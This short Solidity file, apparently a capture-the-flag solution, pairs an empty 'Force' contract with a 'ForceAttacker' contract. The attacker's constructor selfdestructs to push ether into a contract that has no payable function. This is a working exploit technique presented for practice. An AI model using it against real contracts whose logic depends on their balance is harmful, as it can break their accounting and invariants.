// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {
    /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}

contract ForceAttacker {
    constructor(address payable _contractAddress) public payable {
        selfdestruct(_contractAddress);
    }
}
